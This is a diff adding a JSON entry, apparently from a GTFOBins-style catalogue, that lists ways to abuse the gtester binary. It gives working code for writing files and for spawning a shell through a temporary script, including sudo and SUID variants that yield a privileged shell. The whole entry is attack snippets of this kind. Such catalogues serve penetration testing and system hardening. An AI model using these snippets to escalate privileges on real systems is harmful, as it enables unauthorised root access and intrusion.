@@ -1,0 +1,25 @@
+{
+  "functions": {
+    "file-write": [
+      {
+        "description": "Data to be written appears in an XML attribute in the output file (`<testbinary path=\"DATA\">`).",
+        "code": "LFILE=file_to_write\ngtester \"DATA\" -o $LFILE\n"
+      }
+    ],
+    "shell": [
+      {
+        "code": "TF=$(mktemp)\necho '#!/bin/sh' > $TF\necho 'exec /bin/sh -p 0<&1' >> $TF\nchmod +x $TF\ngtester -q $TF\n"
+      }
+    ],
+    "sudo": [
+      {
+        "code": "TF=$(mktemp)\necho '#!/bin/sh' > $TF\necho 'exec /bin/sh 0<&1' >> $TF\nchmod +x $TF\nsudo gtester -q $TF\n"
+      }
+    ],
+    "suid": [
+      {
+        "code": "TF=$(mktemp)\necho '#!/bin/sh -p' > $TF\necho 'exec /bin/sh -p 0<&1' >> $TF\nchmod +x $TF\nsudo gtester -q $TF\n"
+      }
+    ]
+  }
+}
